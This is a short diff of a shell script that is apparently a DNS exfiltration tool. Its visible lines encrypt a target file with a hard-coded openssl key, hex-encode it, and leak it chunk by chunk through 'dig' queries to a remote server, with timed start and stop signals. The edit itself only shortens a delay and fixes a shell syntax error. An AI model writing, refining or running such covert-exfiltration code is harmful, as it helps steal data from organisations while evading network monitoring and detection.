@@ -27,7 +27,7 @@ send_exfil()
 {
   echo signaling server for start...
   signal_exfil_start
-  sleep 20 # a time delay to allow server time to receive exfil start signal
+  sleep 10 # a time delay to allow server time to receive exfil start signal
     for dnsx in `cat $1.hex `; do dig $dnsx.$svr; done
   sleep 10 # a time delay for server
   echo signaling server for stop
@@ -58,4 +58,4 @@ openssl aes-256-cbc -in $1 -out $1.1 -k 1234
   send_exfil $1
   cleanup $1
 else usage
-f
+fi
